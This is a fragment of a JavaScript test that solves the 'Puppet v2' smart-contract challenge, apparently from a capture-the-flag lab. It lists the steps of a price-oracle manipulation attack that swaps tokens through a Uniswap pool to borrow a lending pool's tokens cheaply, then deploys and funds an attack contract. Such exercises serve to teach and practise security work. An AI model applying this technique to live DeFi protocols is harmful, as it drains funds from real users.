...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Execution", async function () {
    ...
    /**
     * NOTES DISCLAIMER: 500.000 = 500000 (spanish notation)
     *
     * STEPS:
     *    1. Swap all our tokens (10.000) for ETH in the uniswap pool
     *    2. Borrow 500.000 tokens of the lendingPool by depositing 14.7 ETH
     *    3. Swap the borrowed tokens (500.000) for ETH in the uniswap pool
     *    4. Borrow the other half of the tokens of the lendingPool depositing 0.005 ETH
     *    5. Swap 5 ETH for 509.898 tokens in the uniswap pool
     *    6. Send the player all 1.009.898 tokens.
     */

    const attackContract = await (
      await ethers.getContractFactory("PuppetV2Attack", player)
    ).deploy(uniswapRouter.address, lendingPool.address, token.address, {
      value: 19n * 10n ** 18n,
    });
    await token
      .connect(player)
      .transfer(attackContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
